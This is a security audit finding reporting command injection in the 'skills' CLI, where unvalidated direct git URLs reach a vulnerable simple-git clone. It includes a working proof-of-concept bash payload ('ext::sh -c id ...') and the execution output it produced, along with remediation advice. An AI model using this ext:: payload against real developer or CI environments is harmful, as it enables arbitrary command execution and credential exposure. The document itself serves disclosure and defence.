# [p10-001] Direct git URL/ref reaches vulnerable simple-git clone boundary

## Summary

The `skills add <source>#<ref>` path accepts attacker-controlled direct git sources and refs, then forwards them to `simple-git` without a first-party scheme or ref allowlist. The installed lockfile resolves `simple-git` to `3.30.0`, which the audit draft identified as affected by 2026 command/protocol bypass advisories fixed in `>=3.32.3`. A malicious skill publisher can therefore hand a victim or automation a crafted `skills add` command that crosses into native `git clone` execution under the developer/CI user's environment.

**Severity:** High  
**PoC Status:** executed

## Details

`runAdd()` takes the CLI `source`, parses it, and later clones non-local/non-well-known sources. The parsed URL and optional ref are passed directly to `cloneRepo()` in the direct git/GitLab/full-depth branch in [`src/add.ts`](https://github.com/vercel-labs/skills/blob/7c0a9af3f8738965b71341712710ac7371089b34/src/add.ts#L941-L1053):

```ts
const parsed = parseSource(source);
// ...
} else {
  // GitLab, git URL, or --full-depth: always clone
  spinner.start('Cloning repository...');
  tempDir = await cloneRepo(parsed.url, parsed.ref);
  spinner.stop('Repository cloned');
```

The parser has explicit cases for GitHub, GitLab, local paths, and well-known HTTP(S) skill indexes, but its final fallback treats any remaining string as a direct git URL. No validation is applied to reject dangerous git protocols such as `ext::`, local file transports, control characters, or dangerous refs before the sink. The decisive fallback is in [`src/source-parser.ts`](https://github.com/vercel-labs/skills/blob/7c0a9af3f8738965b71341712710ac7371089b34/src/source-parser.ts#L372-L386):

```ts
// Well-known skills: arbitrary HTTP(S) URLs that aren't GitHub/GitLab
// This is the final fallback for URLs - we'll check for /.well-known/agent-skills/index.json
// then fall back to /.well-known/skills/index.json
if (isWellKnownUrl(input)) {
  return {
    type: 'well-known',
    url: input,
  };
}

// Fallback: treat as direct git URL
return {
  type: 'git',
  url: input,
  ...(fragmentRef ? { ref: fragmentRef } : {}),
};
```

`cloneRepo()` then constructs a `simpleGit()` instance that inherits `process.env`, only disables terminal prompts/LFS smudge behavior, and invokes `git.clone(url, tempDir, cloneOptions)`. The optional ref becomes `--branch <ref>`, and the URL remains the parser output, as shown in [`src/git.ts`](https://github.com/vercel-labs/skills/blob/7c0a9af3f8738965b71341712710ac7371089b34/src/git.ts#L28-L62):

```ts
export async function cloneRepo(url: string, ref?: string): Promise<string> {
  const tempDir = await mkdtemp(join(tmpdir(), 'skills-'));
  const git = simpleGit({
    timeout: { block: CLONE_TIMEOUT_MS },
    env: {
      ...process.env,
      GIT_TERMINAL_PROMPT: '0',
      GIT_LFS_SKIP_SMUDGE: '1',
    },
    config: [
      'filter.lfs.required=false',
      'filter.lfs.smudge=',
      'filter.lfs.clean=',
      'filter.lfs.process=',
    ],
  });
  const cloneOptions = ref ? ['--depth', '1', '--branch', ref] : ['--depth', '1'];

  try {
    await git.clone(url, tempDir, cloneOptions);
```

The dependency evidence matches the vulnerable boundary: [`pnpm-lock.yaml`](https://github.com/vercel-labs/skills/blob/7c0a9af3f8738965b71341712710ac7371089b34/pnpm-lock.yaml#L39-L41) selects `simple-git` `3.30.0`, and the lockfile entry is [`simple-git@3.30.0`](https://github.com/vercel-labs/skills/blob/7c0a9af3f8738965b71341712710ac7371089b34/pnpm-lock.yaml#L859-L860).

## Root Cause

The implementation relies on `simple-git`/native `git` as the validation boundary for untrusted repository identifiers. Instead, the CLI should enforce its own allowlist before invoking `git clone`: accepted schemes, hosts, URL syntax, and ref syntax should be constrained by the `skills` CLI, and dangerous git protocols/configuration-driven transports should be rejected or disabled. This validation gap is amplified by the outdated `simple-git@3.30.0` version identified in the audit as affected by protocol/command bypass advisories.

## Proof of Concept (PoC)

The PoC is implemented in `piolium/findings/p10-001-direct-git-url-ref-reaches-simple-git-clone/poc.sh` and was executed against the real local CLI. It uses an isolated `HOME` containing `protocol.ext.allow=always` to demonstrate that the direct-git fallback reaches native git protocol handling, then supplies an `ext::` URL that runs `id` and writes an impact marker:

```bash
PAYLOAD="ext::sh -c id% >$IMPACT% 2>&1"
HOME="$POC_HOME" \
XDG_CONFIG_HOME="$POC_HOME/.config" \
GIT_CONFIG_NOSYSTEM=1 \
SKILLS_CLONE_TIMEOUT_MS=15000 \
NO_COLOR=1 \
node "$REPO_ROOT/bin/cli.mjs" add "$PAYLOAD" -y
```

The executed evidence shows that the CLI accepted the direct source, attempted to clone it, and native git executed the helper before the clone failed:

```text
[+] Native git ext helper executed; impact marker: uid=501(acme) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)
{"status": "confirmed", "evidence": "git ext helper wrote process identity to evidence/impact.log", "notes": "real skills CLI accepted a direct ext:: git source and native git executed sh -c before clone failure"}
```

The separate `evidence/impact.log` contains the process identity written by the spawned command, confirming command execution as the invoking user. The PoC is intentionally scoped to local protocol execution; broader exploitability depends on the victim's git/simple-git configuration and the affected `simple-git` bypasses noted in the audit draft.

## Impact

A malicious skill publisher, README, issue comment, or automation input can provide a crafted `skills add <source>#<ref>` value that is interpreted as a direct git source and reaches `git clone`. When the underlying git/simple-git protocol or argument bypass is exploitable, the attacker can execute commands on the developer workstation or CI runner with that user's privileges. In practical terms, this can expose repository contents, SSH/Git credentials, package registry tokens, cloud credentials in environment variables, and any files readable by the process. Severity is High rather than Critical because exploitation requires a victim or automation to run the local CLI with attacker-influenced input.

## Remediation

Upgrade `simple-git` to a fixed release (`>=3.32.3`, preferably the latest available) and add first-party validation before `cloneRepo()` is called. At minimum, reject `ext::`, `file://`, custom protocol helpers, control characters, leading-option syntax, and refs beginning with `-`; allow only expected schemes/hosts and a conservative ref pattern. Also consider forcing safe git protocol config for clone operations, such as disabling `protocol.ext` and local file transports, and add regression tests that exercise direct-git fallback inputs and malicious refs.

## Confirmation (V5 Test Mapping)

Confirm-Status: confirmed-test
Confirm-Method: generated-vitest-reproducer
Confirm-Test: piolium/findings/p10-001-direct-git-url-ref-reaches-simple-git-clone/confirm-test.test.ts
Confirm-Test-Output: piolium/findings/p10-001-direct-git-url-ref-reaches-simple-git-clone/evidence/confirm-test-output.log
Confirm-Evidence: piolium/findings/p10-001-direct-git-url-ref-reaches-simple-git-clone/evidence/confirm-test-output.log; piolium/findings/p10-001-direct-git-url-ref-reaches-simple-git-clone/evidence/confirm-test-evidence.log; piolium/findings/p10-001-direct-git-url-ref-reaches-simple-git-clone/evidence/confirm-impact.log
Confirm-Test-Identity: none
Confirm-Timestamp: 2026-04-30T20:21:16Z
Confirm-Notes: Vitest reproducer ran the real CLI with an ext:: direct-git source under an isolated HOME that enabled protocol.ext; native git executed the helper and wrote uid/gid to confirm-impact.log before clone failure.
